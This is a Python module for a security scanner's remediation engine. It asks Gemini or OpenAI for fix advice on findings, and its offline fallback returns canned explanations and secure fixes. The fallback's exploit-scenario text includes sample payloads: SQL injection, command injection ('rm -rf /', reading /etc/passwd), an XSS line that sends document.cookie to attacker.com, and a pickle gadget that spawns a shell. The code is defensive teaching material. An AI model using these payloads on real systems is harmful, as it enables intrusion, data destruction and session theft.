"""AI remediation engine supporting Gemini, OpenAI, and contextual offline fallback."""

import json
import logging
import os
from pathlib import Path
import subprocess
from typing import Optional
import urllib.error
import urllib.request
from securecommit.ai.prompts import RemediationAdvice, SYSTEM_PROMPT, build_remediation_prompt
from securecommit.scanner.secrets import redact_sensitive_string
from securecommit.utils.config import VulnerabilityCategory, VulnerabilityFinding, get_augmented_env

logger = logging.getLogger(__name__)


class AIRemediationEngine:
    """Manages AI-driven vulnerability remediation generation and safe patch application."""

    def __init__(self):
        self.gemini_api_key = os.environ.get("GEMINI_API_KEY")
        self.openai_api_key = os.environ.get("OPENAI_API_KEY")

    def generate_advice(self, finding: VulnerabilityFinding) -> RemediationAdvice:
        """
        Generate comprehensive vulnerability explanation and secure code fix.
        Prioritizes configured LLM API (Gemini or OpenAI), falling back to rule-based contextual engine.
        """
        # Redact sensitive values before sending
        sanitized_finding = self._sanitize_finding(finding)

        # 1. Attempt Gemini API if configured
        if self.gemini_api_key:
            advice = self._call_gemini(sanitized_finding)
            if advice:
                return advice

        # 2. Attempt OpenAI API if configured
        if self.openai_api_key:
            advice = self._call_openai(sanitized_finding)
            if advice:
                return advice

        # 3. Contextual deterministic remediation engine (offline / no API key)
        return self._generate_contextual_fallback(sanitized_finding)

    def apply_approved_patch(
        self,
        file_path: str,
        original_snippet: str,
        replacement_code: str,
        stage_git: bool = True,
    ) -> bool:
        """
        Safely replace vulnerable code in file with approved secure implementation.
        Requires explicit developer confirmation.
        """
        target_p = Path(file_path).resolve()
        if not target_p.exists() or not target_p.is_file():
            logger.error(f"Cannot patch: file not found at {file_path}")
            return False

        try:
            content = target_p.read_text(encoding="utf-8", errors="replace")
            orig_clean = original_snippet.strip()

            if orig_clean and orig_clean in content:
                # Direct match replacement
                new_content = content.replace(orig_clean, replacement_code.strip(), 1)
            else:
                # Line-level substitution if exact multi-line string was formatted
                lines = content.splitlines()
                replaced = False
                for idx, line in enumerate(lines):
                    if orig_clean and (orig_clean in line or line.strip() in orig_clean):
                        lines[idx] = replacement_code.strip()
                        replaced = True
                        break
                if not replaced:
                    logger.warning(f"Could not locate exact snippet in {file_path} for automated patch.")
                    return False
                new_content = "\n".join(lines) + "\n"

            # Write patched file
            target_p.write_text(new_content, encoding="utf-8")

            # Stage updated file in Git if requested
            if stage_git:
                try:
                    subprocess.run(
                        ["git", "add", str(target_p)],
                        capture_output=True,
                        check=False,
                        env=get_augmented_env(),
                    )
                except Exception:
                    pass

            return True
        except Exception as e:
            logger.error(f"Error applying patch to {file_path}: {e}")
            return False

    def _sanitize_finding(self, finding: VulnerabilityFinding) -> VulnerabilityFinding:
        """Create a safe copy of finding with any potential secrets redacted."""
        f_copy = finding.model_copy()
        if f_copy.category == VulnerabilityCategory.SECRET or "secret" in f_copy.title.lower():
            if f_copy.code_snippet:
                f_copy.code_snippet = redact_sensitive_string(f_copy.code_snippet)
        return f_copy

    def _call_gemini(self, finding: VulnerabilityFinding) -> Optional[RemediationAdvice]:
        """Query Google Gemini API."""
        url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={self.gemini_api_key}"
        prompt = build_remediation_prompt(finding)

        payload = {
            "contents": [
                {
                    "parts": [
                        {"text": f"{SYSTEM_PROMPT}\n\n{prompt}"}
                    ]
                }
            ],
            "generationConfig": {
                "temperature": 0.2,
                "responseMimeType": "application/json",
            }
        }

        try:
            req = urllib.request.Request(
                url,
                data=json.dumps(payload).encode("utf-8"),
                headers={"Content-Type": "application/json"},
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=15) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                text = data["candidates"][0]["content"]["parts"][0]["text"]
                parsed = json.loads(text)
                return RemediationAdvice(
                    vulnerability_id=finding.id,
                    simple_explanation=parsed.get("simple_explanation", ""),
                    why_dangerous=parsed.get("why_dangerous", ""),
                    exploit_scenario=parsed.get("exploit_scenario", ""),
                    suggested_fix_code=parsed.get("suggested_fix_code", ""),
                    safety_justification=parsed.get("safety_justification", ""),
                    original_snippet=finding.code_snippet,
                )
        except Exception as e:
            logger.warning(f"Gemini API request failed: {e}")
            return None

    def _call_openai(self, finding: VulnerabilityFinding) -> Optional[RemediationAdvice]:
        """Query OpenAI API."""
        url = "https://api.openai.com/v1/chat/completions"
        prompt = build_remediation_prompt(finding)

        payload = {
            "model": "gpt-4o-mini",
            "messages": [
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": prompt},
            ],
            "response_format": {"type": "json_object"},
            "temperature": 0.2,
        }

        try:
            req = urllib.request.Request(
                url,
                data=json.dumps(payload).encode("utf-8"),
                headers={
                    "Content-Type": "application/json",
                    "Authorization": f"Bearer {self.openai_api_key}",
                },
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=15) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                text = data["choices"][0]["message"]["content"]
                parsed = json.loads(text)
                return RemediationAdvice(
                    vulnerability_id=finding.id,
                    simple_explanation=parsed.get("simple_explanation", ""),
                    why_dangerous=parsed.get("why_dangerous", ""),
                    exploit_scenario=parsed.get("exploit_scenario", ""),
                    suggested_fix_code=parsed.get("suggested_fix_code", ""),
                    safety_justification=parsed.get("safety_justification", ""),
                    original_snippet=finding.code_snippet,
                )
        except Exception as e:
            logger.warning(f"OpenAI API request failed: {e}")
            return None

    def _generate_contextual_fallback(self, finding: VulnerabilityFinding) -> RemediationAdvice:
        """Contextual built-in secure implementation advice when API key is not present."""
        title_lower = finding.title.lower()
        rule_lower = finding.rule_id.lower()
        snippet = finding.code_snippet or ""

        if "sql" in title_lower or "cwe-89" in rule_lower:
            return RemediationAdvice(
                vulnerability_id=finding.id,
                simple_explanation="Untrusted user input is directly concatenated or formatted into an executable SQL statement.",
                why_dangerous="Attackers can break out of string literals and execute arbitrary SQL commands (e.g. UNION SELECT, DROP TABLE, data exfiltration).",
                exploit_scenario="An attacker provides input like `' OR 1=1 --` to bypass authentication or access restricted tables.",
                suggested_fix_code='query = "SELECT * FROM users WHERE username = ?"\ncursor.execute(query, (username,))',
                safety_justification="Parameterized queries separate SQL structure from user data. Parameters are treated strictly as literals, eliminating SQL syntax injection.",
                original_snippet=snippet,
            )

        elif "command" in title_lower or "cwe-78" in rule_lower:
            return RemediationAdvice(
                vulnerability_id=finding.id,
                simple_explanation="Operating system commands are constructed via string concatenation or executed through an unescaped shell.",
                why_dangerous="Command injection allows remote adversaries to execute arbitrary system binaries with the permissions of the application process.",
                exploit_scenario="An attacker supplies a payload like `; rm -rf / ;` or `| cat /etc/passwd` to trigger unauthorized system execution.",
                suggested_fix_code="import subprocess\nsubprocess.run(['tar', '-czf', 'backup.tar.gz', directory_path], check=True, shell=False)",
                safety_justification="Passing command arguments as an array with shell=False directly invokes the target binary without shell interpretation or command chaining.",
                original_snippet=snippet,
            )

        elif "secret" in title_lower or "token" in title_lower or "api key" in title_lower or finding.category == VulnerabilityCategory.SECRET:
            return RemediationAdvice(
                vulnerability_id=finding.id,
                simple_explanation="A sensitive credential or API key is hardcoded directly into the source code repository.",
                why_dangerous="Anyone with read access to the repository or git history can steal the credential, impersonate authorized services, or compromise accounts.",
                exploit_scenario="An adversary searches public commits or decompiles the binary to extract the hardcoded token and hijack the underlying service.",
                suggested_fix_code="import os\nAPI_KEY = os.environ.get('API_KEY')",
                safety_justification="Fetching credentials from environment variables or a secure secret manager keeps secrets out of version control and git history.",
                original_snippet=snippet,
            )

        elif "cross-site" in title_lower or "xss" in title_lower or "cwe-79" in rule_lower:
            return RemediationAdvice(
                vulnerability_id=finding.id,
                simple_explanation="Unsanitized user data is injected into HTML or markup templates without contextual output encoding.",
                why_dangerous="Malicious JavaScript can be executed within victim browsers, stealing session cookies, auth tokens, or redirecting users.",
                exploit_scenario="An attacker submits `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`.",
                suggested_fix_code="import markupsafe\nsafe_output = markupsafe.escape(user_input)",
                safety_justification="HTML entity escaping converts dangerous characters (`<`, `>`, `&`, `\"`) into harmless entity representations, preventing browser execution.",
                original_snippet=snippet,
            )

        elif "deserialization" in title_lower or "pickle" in rule_lower or "cwe-502" in rule_lower:
            return RemediationAdvice(
                vulnerability_id=finding.id,
                simple_explanation="Untrusted serialized binary data is unpacked using an unsafe deserializer such as Python's pickle.",
                why_dangerous="Pickle byte streams can instantiate arbitrary Python objects and execute arbitrary code via `__reduce__`.",
                exploit_scenario="An attacker constructs a pickled gadget chain that executes `os.system('/bin/bash')` upon `pickle.loads()`.",
                suggested_fix_code="import json\ndata = json.loads(payload)",
                safety_justification="JSON and pure data serialization formats cannot execute arbitrary constructors or native executable code.",
                original_snippet=snippet,
            )

        elif "cryptography" in title_lower or "hash" in title_lower or "cwe-328" in rule_lower:
            return RemediationAdvice(
                vulnerability_id=finding.id,
                simple_explanation="Use of obsolete or cryptographically weak hashing algorithms (e.g. MD5 or SHA-1).",
                why_dangerous="MD5 and SHA-1 suffer from collision and pre-image attacks where two distinct inputs generate the identical hash.",
                exploit_scenario="An adversary generates a malicious certificate or binary with the same MD5 hash as a trusted object.",
                suggested_fix_code="import hashlib\nhash_str = hashlib.sha256(data).hexdigest()",
                safety_justification="SHA-256 is cryptographically robust and resistant to collision attacks.",
                original_snippet=snippet,
            )

        elif "docker" in title_lower or "user" in title_lower or "root" in title_lower:
            return RemediationAdvice(
                vulnerability_id=finding.id,
                simple_explanation="Container is configured to execute as root user, increasing the attack surface if the container is compromised.",
                why_dangerous="In the event of a container breakout vulnerability, the process possesses full root privileges on the underlying host node.",
                exploit_scenario="An attacker exploiting a runtime vulnerability immediately obtains root execution inside the container.",
                suggested_fix_code="USER 10001:10001",
                safety_justification="Adhering to the principle of least privilege ensures containerized workloads run with non-root UID/GID.",
                original_snippet=snippet,
            )

        # Generic default advice
        return RemediationAdvice(
            vulnerability_id=finding.id,
            simple_explanation=finding.description or "Security pattern violation detected by scanner.",
            why_dangerous="This security issue may introduce exploitable conditions in production deployments.",
            exploit_scenario="Adversaries could leverage this misconfiguration to bypass controls or access sensitive data.",
            suggested_fix_code="# Apply security hardening following standard best practices",
            safety_justification="Hardening code to eliminate known vulnerabilities reduces the total attack surface.",
            original_snippet=snippet,
        )
